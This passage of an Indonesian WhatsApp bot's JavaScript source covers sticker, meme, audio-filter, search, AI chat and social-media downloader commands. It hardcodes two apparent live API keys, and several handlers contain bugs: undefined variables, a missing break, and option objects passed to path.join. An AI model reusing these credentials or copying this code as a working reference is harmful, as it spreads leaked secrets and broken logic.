					let data = await fetchJson(`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`, { quoted: fkontak1 })
					m.reply(`*🏙 Cuaca Kota ${data.name}*\n\n*🌤️ Cuaca :* ${data.weather[0].main}\n*📝 Deskripsi :* ${data.weather[0].description}\n*🌡️ Suhu Rata-rata :* ${data.main.temp} °C\n*🤔 Terasa Seperti :* ${data.main.feels_like} °C\n*🌬️ Tekanan :* ${data.main.pressure} hPa\n*💧 Kelembapan :* ${data.main.humidity}%\n*🌪️ Kecepatan Angin :* ${data.wind.speed} Km/h\n*📍Lokasi :*\n- *Bujur :* ${data.coord.lat}\n- *Lintang :* ${data.coord.lon}\n*🌏 Negara :* ${data.sys.country}`, { quoted: fkontak1 })
				} catch (e) {
					m.reply('Kota Tidak Di Temukan!', { quoted: fkontak1 })
				}
			}
			    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
			break
			case 'sticker': case 'stiker': case 's': case 'stickergif': case 'stikergif': case 'sgif': case 'stickerwm': case 'swm': case 'curi': case 'colong': case 'take': case 'stickergifwm': case 'sgifwm': {
				if (!/image|video|sticker/.test(quoted.type)) return m.reply(`Kirim/reply gambar/video/gif dengan caption ${prefix + command}\nDurasi Image/Video/Gif 1-9 Detik`, { quoted: fkontak1 })
				let media = await quoted.download()
				let teks1 = text.split`|`[0] ? text.split`|`[0] : ''
				let teks2 = text.split`|`[1] ? text.split`|`[1] : ''
				if (/image|webp/.test(mime)) {
					m.reply(mess.wait)
					await Xlesy.sendAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
				} else if (/video/.test(mime)) {
					if ((qmsg).seconds > 11) return m.reply('Maksimal 10 detik!')
					m.reply(mess.wait)
					await Xlesy.sendAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
				} else {
					m.reply(`Kirim/reply gambar/video/gif dengan caption ${prefix + command}\nDurasi Video/Gif 1-9 Detik`, { quoted: fkontak1 })
				}
			}
			break
			case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
				try {
					//if (!isPremium) return m.reply(mess.prem)
					if (!isLimit) return m.reply(mess.limit)
					if (!/image|webp/.test(mime)) return m.reply(`Kirim/reply image/sticker\nDengan caption ${prefix + command} atas|bawah`, { quoted: fkontak1 })
					if (!text) return m.reply(`Kirim/reply image/sticker dengan caption ${prefix + command} atas|bawah`, { quoted: fkontak1 })
					m.reply(mess.wait)
					let atas = text.split`|`[0] ? text.split`|`[0] : '-'
					let bawah = text.split`|`[1] ? text.split`|`[1] : '-'
					let media = await quoted.download()
					let mem = await UguuSe(media)
					let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem.url}`
					await Xlesy.sendAsSticker(m.chat, smeme, m, { packname: packname, author: author })
					setLimit(m, db)
				} catch (e) {
					m.reply('Server Meme Sedang Offline!')
				}
			}
			case 'emojimix': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} 😅+🤔`, { quoted: fkontak1 })
				let [emoji1, emoji2] = text.split`+`
				if (!emoji1 && !emoji2) return m.reply(`Example: ${prefix + command} 😅+🤔`, { quoted: fkontak1 })
				try {
					let anu = await axios.get(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`, { quoted: fkontak1 })
					if (anu.data.results.length < 1) return m.reply(`Mix Emoji ${text} Tidak Ditemukan!`, { quoted: fkontak1 })
					for (let res of anu.data.results) {
						await Xlesy.sendAsSticker(m.chat, res.url, m, { packname: packname, author: author })
					}
					setLimit(m, db)
				} catch (e) {
					m.reply('Gagal Mix Emoji!',
					{ quoted: fkontak1 })
				}
			}
			break
			case 'qc': case 'quote': case 'fakechat': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text && !m.quoted) return m.reply(`Kirim/reply pesan *${prefix + command}* Teksnya`, { quoted: fkontak1 })
				try {
					let ppnya = await Xlesy.profilePictureUrl(m.sender, 'image').catch(() => 'https://i.pinimg.com/564x/8a/e9/e9/8ae9e92fa4e69967aa61bf2bda967b7b.jpg');
					let res = await quotedLyo(text, m.pushName, ppnya);
					await Xlesy.sendAsSticker(m.chat, Buffer.from(res.result.image, 'base64'), m, { packname: packname, author: author })
					setLimit(m, db)
				} catch (e) {
					m.reply('Server Create Sedang Offline!')
				}
			}
			break
			case 'bratanime': {
    await Xlesy.sendMessage(m.chat, { react: { text: '🕑', key: m.key } })
    if (!isLimit) return m.reply(mess.limit, { quoted: fkontak1 })
    if (!text && (!m.quoted || !m.quoted.text)) return m.reply(`Kirim/reply pesan *${prefix + command}* Teksnya`, { quoted: fkontak1 })
try {
					await Xlesy.sendAsSticker(m.chat, 'https://api.agungny.my.id/api/animbrat?q=' + encodeURIComponent(text || m.quoted.text), m)
					setLimit(m, db)
				} catch (e) {
					try {
						await Xlesy.sendAsSticker(m.chat, 'https://api.agungny.my.id/api/animbrat?q=pp' + encodeURIComponent(text || m.quoted.text), { quoted: fkontak1 })
						setLimit(m, db)
					} catch (e) {
						m.reply('Server Brat Sedang Offline!',
										{ quoted: fkontak1 })
					}
				}
    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
}
break
			case 'brat': {
			    await Xlesy.sendMessage(m.chat, { react: { text: '🕑', key: m.key } })
				if (!isLimit) return m.reply(mess.limit)
				if (!text && (!m.quoted || !m.quoted.text)) return m.reply(`Kirim/reply pesan *${prefix + command}* Teksnya`, { quoted: fkontak1 })
				try {
					await Xlesy.sendAsSticker(m.chat, 'https://brat.caliphdev.com/api/brat?text=' + encodeURIComponent(text || m.quoted.text), m)
					setLimit(m, db)
				} catch (e) {
					try {
						await Xlesy.sendAsSticker(m.chat, 'https://mannoffc-x.hf.space/brat?q=' + encodeURIComponent(text || m.quoted.text), { quoted: fkontak1 })
						setLimit(m, db)
					} catch (e) {
						m.reply('Server Brat Sedang Offline!',
										{ quoted: fkontak1 })
					}
				}
				    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
			}
			break
							    await Xlesy.sendMessage(m.chat, { react: { text: '🕑', key: m.key } })
			case 'bratvid': case 'bratvideo': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text && (!m.quoted || !m.quoted.text)) return m.reply(`Kirim/reply pesan *${prefix + command}* Teksnya`,
				{ quoted: fkontak1 })
				const teks = (m.quoted ? m.quoted.text : text).split(' ');
				const tempDir = path.join(process.cwd(), 'database/sampah');
				try {
					const framePaths = [];
					for (let i = 0; i < teks.length; i++) {
						const currentText = teks.slice(0, i + 1).join(' ');
						let ress
						try {
							res = await axios.get('https://brat.caliphdev.com/api/brat?text=' + encodeURIComponent(currentText), { responseType: 'arraybuffer' });
						} catch (e) {
							res = await axios.get('https://mannoffc-x.hf.space/brat?q=' + encodeURIComponent(currentText), { responseType: 'arraybuffer' });
						}
						const framePath = path.join(tempDir, `${m.sender + i}.mp4`, { quoted: fkontak1 });
						fs.writeFileSync(framePath, res.data);
						framePaths.push(framePath);
					}
					const fileListPath = path.join(tempDir, `${m.sender}.txt`, { quoted: fkontak1 });
					let fileListContent = '';
					for (let i = 0; i < framePaths.length; i++) {
						fileListContent += `file '${framePaths[i]}'\n`;
						fileListContent += `duration 0.5\n`;
					}
					fileListContent += `file '${framePaths[framePaths.length - 1]}'\n`;
					fileListContent += `duration 3\n`;
					fs.writeFileSync(fileListPath, fileListContent);
					const outputVideoPath = path.join(tempDir, `${m.sender}-output.mp4`, { quoted: fkontak1 });
					execSync(`ffmpeg -y -f concat -safe 0 -i ${fileListPath} -vf 'fps=30' -c:v libx264 -preset veryfast -pix_fmt yuv420p -t 00:00:10 ${outputVideoPath}`, { quoted: fkontak1 });
					Xlesy.sendAsSticker(m.chat, outputVideoPath, m, { packname: packname, author: author })
					framePaths.forEach((filePath) => fs.unlinkSync(filePath));
					fs.unlinkSync(fileListPath);
					fs.unlinkSync(outputVideoPath);
					setLimit(m, db)
				} catch (e) {
					console.log(e)
					m.reply('Terjadi Kesalahan Saat Memproses Permintaan!',
									{ quoted: fkontak1 })
				}
								    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
			}
			break
			case 'wasted': {
				if (!isLimit) return m.reply(mess.limit)
				try {
					if (/jpg|jpeg|png/.test(mime)) {
						m.reply(mess.wait)
						let media = await quoted.download()
						let anu = await UguuSe(media)
						await Xlesy.sendFileUrl(m.chat, 'https://some-random-api.com/canvas/wasted?avatar=' + anu.url, 'Nih Bro', m)
						setLimit(m, db)
					} else {
						m.reply('Send Media yg ingin di Upload', { quoted: fkontak1 })
					}
				} catch (e) {
					m.reply('Server Canvas Sedang Offline!', { quoted: fkontak1 })
				}
			}
			break
			case 'trigger': case 'triggered': {
				if (!isLimit) return m.reply(mess.limit)
				try {
					if (/jpg|jpeg|png/.test(mime)) {
						m.reply(mess.wait)
						let media = await quoted.download()
						let anu = await UguuSe(media)
						await m.reply({ document: { url: 'https://some-random-api.com/canvas/triggered?avatar=' + anu.url }, fileName: 'triggered.gif', mimetype: 'image/gif' })
						setLimit(m, db)
					} else {
						m.reply('Send Media yg ingin di Upload!')
					}
				} catch (e) {
					m.reply('Server Canvas Sedang Offline!')
				}
			}
			break
			case 'nulis': {
				m.reply(`*Example*\n${prefix}nuliskiri\n${prefix}nuliskanan\n${prefix}foliokiri\n${prefix}foliokanan`, { quoted: fkontak1})
			}
			break
			case 'nuliskiri': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Kirim perintah *${prefix + command}* Teksnya`, { quoted: fkontak1})
				m.reply(mess.wait)
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
				spawn('convert', [
					'./src/nulis/images/buku/sebelumkiri.jpg',
					'-font',
					'./src/nulis/font/Indie-Flower.ttf',
					'-size',
					'960x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'2',
					'-annotate',
					'+140+153',
					fixHeight,
					'./src/nulis/images/buku/setelahkiri.jpg'
				])
				.on('error', () => m.reply(mess.error))
				.on('exit', () => {
					m.reply({ image: fs.readFileSync('./src/nulis/images/buku/setelahkiri.jpg'), caption: 'Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ' }, { quoted: fkontak1})
					setLimit(m, db)
				})
			}
			break
			case 'nuliskanan': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Kirim perintah *${prefix + command}* Teksnya`, { quoted: fkontak1})
				m.reply(mess.wait)
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
				spawn('convert', [
					'./src/nulis/images/buku/sebelumkanan.jpg',
					'-font',
					'./src/nulis/font/Indie-Flower.ttf',
					'-size',
					'960x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'2',
					'-annotate',
					'+128+129',
					fixHeight,
					'./src/nulis/images/buku/setelahkanan.jpg'
				])
				.on('error', () => m.reply(mess.error))
				.on('exit', () => {
					m.reply({ image: fs.readFileSync('./src/nulis/images/buku/setelahkanan.jpg'), caption: 'Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ' }, { quoted: fkontak1})
					setLimit(m, db)
				})
			}
			break
			case 'foliokiri': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Kirim perintah *${prefix + command}* Teksnya`, { quoted: fkontak1})
				m.reply(mess.wait)
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
				spawn('convert', [
					'./src/nulis/images/folio/sebelumkiri.jpg',
					'-font',
					'./src/nulis/font/Indie-Flower.ttf',
					'-size',
					'1720x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'4',
					'-annotate',
					'+48+185',
					fixHeight,
					'./src/nulis/images/folio/setelahkiri.jpg'
				])
				.on('error', () => m.reply(mess.error))
				.on('exit', () => {
					m.reply({ image: fs.readFileSync('./src/nulis/images/folio/setelahkiri.jpg'), caption: 'Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ' }, { quoted: fkontak1})
					setLimit(m, db)
				})
			}
			break
			case 'foliokanan': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Kirim perintah *${prefix + command}* Teksnya`, { quoted: fkontak1})
				m.reply(mess.wait)
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
				spawn('convert', [
					'./src/nulis/images/folio/sebelumkanan.jpg',
					'-font',
					'./src/nulis/font/Indie-Flower.ttf',
					'-size',
					'1720x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'4',
					'-annotate',
					'+89+190',
					fixHeight,
					'./src/nulis/images/folio/setelahkanan.jpg'
				])
				.on('error', () => m.reply(mess.error))
				.on('exit', () => {
					m.reply({ image: fs.readFileSync('./src/nulis/images/folio/setelahkanan.jpg'), caption: 'Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ' }, { quoted: fkontak1})
					setLimit(m, db)
				})
			}
			break
			case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai': {
				try {
					let set;
					if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
					if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
					if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
					if (/earrape/.test(command)) set = '-af volume=12'
					if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
					if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
					if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
					if (/reverse/.test(command)) set = '-filter_complex "areverse"'
					if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
					if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
					if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
					if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
					if (/audio/.test(mime)) {
						m.reply(mess.wait)
						let media = await Xlesy.downloadAndSaveMediaMessage(qmsg)
						let ran = `./database/sampah/${getRandom('.mp3')}`;
						exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
							fs.unlinkSync(media)
							if (err) return m.reply(err)
							let buff = fs.readFileSync(ran)
							m.reply({ audio: buff, mimetype: 'audio/mpeg' })
							fs.unlinkSync(ran)
						});
					} else {
						m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`, { quoted: fkontak1 })
					}
				} catch (e) {
					m.reply('Gagal!')
				}
			}
			break
			case 'tinyurl': case 'shorturl': case 'shortlink': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text || !isUrl(text)) return m.reply(`Example: ${prefix + command} https://github.com/Gxyenn`, { quoted: fkontak1 })
				try {
					let anu = await axios.get('https://tinyurl.com/api-create.php?url=' + text)
					m.reply('Url : ' + anu.data)
					setLimit(m, db)
				} catch (e) {
					m.reply('Gagal!')
				}
			}
			break
            case 'ai': {  
			if (!text) return m.reply(`Example: ${prefix + command} query`, { quoted: fkontak1 }) 
			try {  
				let hasil = await yanzGpt(text)  
				m.reply(hasil.choices[0].message.content)  
			} catch (e) {  
				try {  
					let hasil = await youSearch(text)  
					m.reply(hasil)  
				} catch (e) {  
					try {  
						let hasil = await bk9Ai(text)  
						m.reply(hasil.BK9)  
					} catch (e) {  
						m.reply(pickRandom(['Fitur Ai sedang bermasalah!','Tidak dapat terhubung ke ai!','Sistem Ai sedang sibuk sekarang!','Fitur sedang tidak dapat digunakan!']), { quoted: fkontak1 })  
					}  
				}  
			}  
		}  
break
		case 'simi': {  
			if (!text) return m.reply(`Example: ${prefix + command} query`, { quoted: fkontak1 }) 
			try {  
				const hasil = await simi(text)  
				m.reply(hasil.success)  
			} catch (e) {  
				m.reply('Server simi sedang offline!', { quoted: fkontak1 }) 
			}  
		}  
		break

			case 'txt2img': case 'texttoimage': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} anime, HD`, { quoted: fkontak1 })
				try {
					await Xlesy.sendFileUrl(m.chat, `https://widipe.com/ai/text2img?text=${encodeURIComponent(text)}`, 'Done', m)
					setLimit(m, db)
				} catch (e) {
					m.reply('Gagal Create Gambar!', { quoted: fkontak1 })
				}
			}
			break
			
			// Search Menu
			case 'searchgroup': {
			await Xlesy.sendMessage(m.chat, { react: { text: '🔍', key: m.key } })
    if (!text) return m.reply(`Example: ${prefix + command} bot wa`);
    
    try {
        let anu = `https://api.agungny.my.id/api/searchgroup?q=${encodeURIComponent(text)}`;
        let response = await fetch(anu);
        let data = await response.json();

        if (!data || !data.result || data.result.length === 0) {
            return m.reply('Tidak ditemukan grup WhatsApp yang sesuai dengan pencarian!');
        }

        let hasil = `*📌 Hasil Pencarian Grup WhatsApp: "${text}" 📌*\n\n`;
        data.result.slice(0, 5).forEach((group, i) => {
            hasil += `*${i + 1}. ${group.title}*\n`;
            hasil += `👤 Member: ${group.members}\n`;
            hasil += `🔗 Link: ${group.link}\n\n`;
        });

        m.reply(hasil, { quoted: fkontak1 })
    } catch (e) {
        console.error(e);
        m.reply('Terjadi kesalahan saat mencari grup WhatsApp!');
    }
}
break;
			case 'google': {
						    await Xlesy.sendMessage(m.chat, { react: { text: '🔍', key: m.key } })
				if (!text) return m.reply(`Example: ${prefix + command} query`, { quoted: fkontak1 })
				try {
					let anu = await youSearch(text);
					m.reply(anu)
				} catch (e) {
					try {
						let anu = await yanzGpt(text);
						m.reply(hasil.choices[0].message.content)
					} catch (e) {
						m.reply('Pencarian Tidak Ditemukan!',
						{ quoted: fkontak1 })
					}
				}
			}
			    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
			break
			case 'gimage': {
			    await Xlesy.sendMessage(m.chat, { react: { text: '🔍', key: m.key } })
				if (!text) return m.reply(`Example: ${prefix + command} query`, { quoted: fkontak1 })
				gis(text, async (err, result) => {
					if (err) return m.reply(`Image Untuk Query : _${text}_\nTidak Ditemukan!`, { quoted: fkontak1 })
					if (result == undefined) {
						m.reply(`Image Untuk Query : _${text}_\nTidak Ditemukan!`, { quoted: fkontak1 })
					} else if (result.length > 1) {
						let anu = pickRandom(result)
						await m.reply({ image: { url: anu.url }, caption: 'Url : '+ anu.url })
					} else m.reply('Gagal Mencari Gambar!', { quoted: fkontak1 })
				});
			}
			break
			case 'searchspotify': case 'sspotify': {
    if (!text) return m.reply(`Gunakan contoh: ${prefix + command} judul lagu`, { quoted: fkontak1 }) 

    try {
        let query = encodeURIComponent(text);
        let response = await fetch(`https://api.agungny.my.id/api/spotifys?q=${query}`);
        let data = await response.json();

        if (!data || !data.result || data.result.length === 0) {
            return m.reply('❌ Lagu tidak ditemukan!', { quoted: fkontak1 })
        }

        let lagu = data.result[0]; // Ambil hasil pertama
        let pesan = `🎵 *Spotify Search*\n\n`;
        pesan += `📌 *Judul:* ${lagu.title}\n`;
        pesan += `👤 *Artis:* ${lagu.artist}\n`;
        pesan += `📀 *Album:* ${lagu.album}\n`;
        pesan += `🔗 *Link:* ${lagu.url}\n`;

        Xlesy.sendMessage(from, { image: { url: lagu.thumb }, caption: pesan }, { quoted: fkontak1 });
    } catch (error) {
        console.error(error);
        m.reply('❌ Terjadi kesalahan saat mencari lagu.', { quoted: fkontak1 });
    }
}
break;
			case 'play': case 'ytplay': case 'yts': case 'ytsearch': case 'youtubesearch': {
			    await Xlesy.sendMessage(m.chat, { react: { text: '🔍', key: m.key } })
				if (!text) return m.reply(`Example: ${prefix + command} dj komang`, { quoted: fkontak1}, { quoted: fkontak1 })
				m.reply(mess.wait)
				try {
					const res = await yts.search(text);
					const hasil = pickRandom(res.all)
					const teksnya = `*📍Title:* ${hasil.title || 'Tidak tersedia'}\n*✏Description:* ${hasil.description || 'Tidak tersedia'}\n*🌟Channel:* ${hasil.author?.name || 'Tidak tersedia'}\n*⏳Duration:* ${hasil.seconds || 'Tidak tersedia'} second (${hasil.timestamp || 'Tidak tersedia'})\n*🔎Source:* ${hasil.url || 'Tidak tersedia'}\n\n_note : jika ingin mendownload silahkan_\n_pilih ${prefix}ytmp3 url_video atau ${prefix}ytmp4 url_video_`;
					await m.reply({ image: { url: hasil.thumbnail }, caption: teksnya }, { quoted: fkontak1 })
				} catch (e) {
					m.reply('Post not available!',
					{ quoted: fkontak1 })
				}
			}
			    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
			break
			case 'pixiv': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} hu tao`,
				{ quoted: fkontak1 })
				try {
					let { pixivdl } = require('./lib/pixiv')
					let res = await pixivdl(text)
					m.reply(mess.wait)
					for (let i = 0; i < res.media.length; i++) {
						let caption = i == 0 ? `${res.caption}\n\n*By:* ${res.artist}\n*Tags:* ${res.tags.join(', ')}` : ''
						let mime = (await FileType.fromBuffer(res.media[i])).mime 
						await m.reply({ [mime.split('/')[0]]: res.media[i], caption, mimetype: mime })
					}
					setLimit(m, db)
				} catch (e) {
					m.reply('Post not available!',
					{ quoted: fkontak1 })
				}
			}
			break
			case 'pinterest': case 'pint': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} hu tao`,
				{ quoted: fkontak1 })
				try {
					let anu = await pinterest(text)
					let result = pickRandom(anu)
					if (anu.length < 1) {
						m.reply('Post not available!',
						{ quoted: fkontak1 })
					} else {
						await m.reply({ image: { url: result.images_url }, caption: `*Media Url :* ${result.pin}${result.link ? '\n*Source :* ' + result.link : ''}` },
						{ quoted: fkontak1 })
						setLimit(m, db)
					}
				} catch (e) {
					m.reply('Pencarian tidak ditemukan!',
					{ quoted: fkontak1 })
				}
			}
			break
			case 'wallpaper': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} hu tao`,
				{ quoted: fkontak1 })
				try {
					let anu = await wallpaper(text)
					let result = pickRandom(anu)
					if (anu.length < 1) {
						m.reply('Post not available!',
						{ quoted: fkontak1 })
					} else {
						await m.reply({ image: { url: result.image[0] }, caption: `⭔ title : ${q}\n⭔ category : ${result.type}\n⭔ media url : ${result.image[2] || result.image[1] || result.image[0]}`},
						{ quoted: fkontak1 })
						setLimit(m, db)
					}
				} catch (e) {
					m.reply('Server wallpaper sedang offline!',
					{ quoted: fkontak1 })    
				}
			}
			break
			case 'ringtone': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} black rover`, { quoted: fkontak1 })
				let anu = await ringtone(text)
				let result = pickRandom(anu)
				await m.reply({ audio: { url: result.audio }, fileName: result.title + '.mp3', mimetype: 'audio/mpeg' },
				{ quoted: fkontak1 })
				setLimit(m, db)
			}
			break
			case 'npm': case 'npmjs': {
				if (!text) return m.reply(`Example: ${prefix + command} axios`,
				{ quoted: fkontak1 })
				try {
					let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`, { quoted: fkontak1 })
					let { objects } = await res.json()
					if (!objects.length) return m.reply('Pencarian Tidak di temukan',
					{ quoted: fkontak1 })
					let txt = objects.map(({ package: pkg }) => {
						return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
					}).join`\n\n`
					m.reply(txt)
				} catch (e) {
					m.reply('Pencarian Tidak di temukan',
					{ quoted: fkontak1 })
				}
			}
			break
			case 'style': {
				if (!text) return m.reply(`Example: ${prefix + command} Xlesy`,
				{ quoted: fkontak1 })
				let anu = await styletext(text)
				let txt = anu.map(a => `*${a.name}*\n${a.result}`, { quoted: fkontak1 }).join`\n\n`
				m.reply(txt)
			}
			break
			case 'spotify': case 'spotifysearch': {
				if (!text) return m.reply(`Example: ${prefix + command} alan walker alone`,
				{ quoted: fkontak1 })
				try {
					let hasil = await fetchJson('https://www.bhandarimilan.info.np/spotisearch?query=' + encodeURIComponent(text));
					let txt = hasil.map(a => {
						return `*Name : ${a.name}*\n- Artist : ${a.artist}\n- Url : ${a.link}`
					}).join`\n\n`
					m.reply(txt)
				} catch (e) {
					m.reply('Server Search Offline!',
					{ quoted: fkontak1 })					
				}
			}
			break
			
			// Downloader Menu
			case 'ytmp3': case 'ytaudio': case 'ytplayaudio': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} url_youtube`, { quoted: fkontak1 })
				if (!text.includes('youtu')) return m.reply('Url Tidak Mengandung Result Dari Youtube!')
				m.reply(mess.wait)
				try {
					const hasil = await ytMp3(text);
					await m.reply({
						audio: { url: hasil.result },
						mimetype: 'audio/mpeg',
						contextInfo: {
							externalAdReply: {
								title: hasil.title,
								body: hasil.channel,
								previewType: 'PHOTO',
								thumbnailUrl: hasil.thumb,
								mediaType: 1,
								renderLargerThumbnail: true,
								sourceUrl: text
							}
						}
					})
					setLimit(m, db)
				} catch (e) {
					try {
						let hasil = await fetchJson('https://ytdl.axeel.my.id/api/download/audio?url=' + text)
						await Xlesy.sendFileUrl(m.chat, hasil.downloads.url, hasil.metadata.title, m)
						setLimit(m, db)
					} catch (e) {
						try {
							let hasil = await fetchJson(api('hitori','/download/youtube', { url: text }, 'apikey'))
							await Xlesy.sendFileUrl(m.chat, hasil.result.resultUrl.audio[0].download, hasil.result.title, m)
							setLimit(m, db)
						} catch (e) {
							m.reply('Gagal Mendownload Audio!')
						}
					}
				}
			}
			break
			case 'ytmp4': case 'ytvideo': case 'ytplayvideo': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} url_youtube`, { quoted: fkontak1 })
				if (!text.includes('youtu')) return m.reply('Url Tidak Mengandung Result Dari Youtube!')
				m.reply(mess.wait)
				try {
					const hasil = await ytMp4(text);
					await m.reply({ video: hasil.result, caption: `*📍Title:* ${hasil.title}\n*✏Description:* ${hasil.desc ? hasil.desc : ''}\n*🚀Channel:* ${hasil.channel}\n*🗓Upload at:* ${hasil.uploadDate}` })
					setLimit(m, db)
				} catch (e) {
					try {
						let hasil = await fetchJson('https://ytdl.axeel.my.id/api/download/video?url=' + text)
						await Xlesy.sendFileUrl(m.chat, hasil.downloads.url, hasil.metadata.title, m)
						setLimit(m, db)
					} catch (e) {
						try {
							await Xlesy.sendFileUrl(m.chat, 'https://simple.nvlgroup.my.id/download/youtube?url=' + text, '', m)
							setLimit(m, db)
						} catch (e) {
							m.reply('Gagal Mendownload Audio!')
						}
					}
				}
			}
			break
			case 'ig': case 'instagram': case 'instadl': case 'igdown': case 'igdl': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} url_instagram`, { quoted: fkontak1 })
				if (!text.includes('instagram.com')) return m.reply('Url Tidak Mengandung Result Dari Instagram!')
				m.reply(mess.wait)
				try {
					const hasil = await instagramDl(text);
					if(hasil.length < 0) return m.reply('Postingan Tidak Tersedia atau Privat!')
					for (let i = 0; i < hasil.length; i++) {
						await Xlesy.sendFileUrl(m.chat, hasil[i].url, 'Done', m)
					}
					setLimit(m, db)
				} catch (e) {
					try {
						let hasil = await fetchJson(api('hitori','/download/instagram', { url: text }, 'apikey'))
						if(hasil.result.length < 0) return m.reply('Postingan Tidak Tersedia atau Privat!')
						for (let i = 0; i < hasil.result.length; i++) {
							await Xlesy.sendFileUrl(m.chat, hasil.result[i].imageUrl, 'Done', m)
						}
						setLimit(m, db)
					} catch (e) {
						m.reply('Postingan Tidak Tersedia atau Privat!')
					}
				}
			}
			break
			case 'igstory': case 'instagramstory': case 'instastory': case 'storyig': {
				if (!text) return m.reply(`Example: ${prefix + command} usernamenya`, { quoted: fkontak1 })
				try {
					const hasil = await instaStory(text);
					m.reply(mess.wait)
					for (let i = 0; i < hasil.results.length; i++) {
						await Xlesy.sendFileUrl(m.chat, hasil.results[i].url, 'Done', m)
					}
				} catch (e) {
					m.reply('Username tidak ditemukan atau Privat!');
				}
			}
			break
			case 'tiktok': case 'tiktokdown': case 'ttdown': case 'ttdl': case 'tt': case 'ttmp4': case 'ttvideo': case 'tiktokmp4': case 'tiktokvideo': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} url_tiktok`, { quoted: fkontak1 })
				if (!text.includes('tiktok.com')) return m.reply('Url Tidak Mengandung Result Dari Tiktok!')
				try {
					const hasil = await tiktokDl(text);
					m.reply(mess.wait)
					if (hasil && hasil.size_nowm) {
						await Xlesy.sendFileUrl(m.chat, hasil.data[1].url, `*📍Title:* ${hasil.title}\n*⏳Duration:* ${hasil.duration}\n*🎃Author:* ${hasil.author.nickname} (@${hasil.author.fullname})`, m)
					} else {
						for (let i = 0; i < hasil.data.length; i++) {
							await Xlesy.sendFileUrl(m.chat, hasil.data[i].url, `*🚀Image:* ${i+1}`, m)
						}
					}
					setLimit(m, db)
				} catch (e) {
					m.reply('Gagal/Url tidak valid!')
				}
			}
			break
			case 'ttmp3': case 'tiktokmp3': case 'ttaudio': case 'tiktokaudio': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} url_tiktok`, { quoted: fkontak1 })
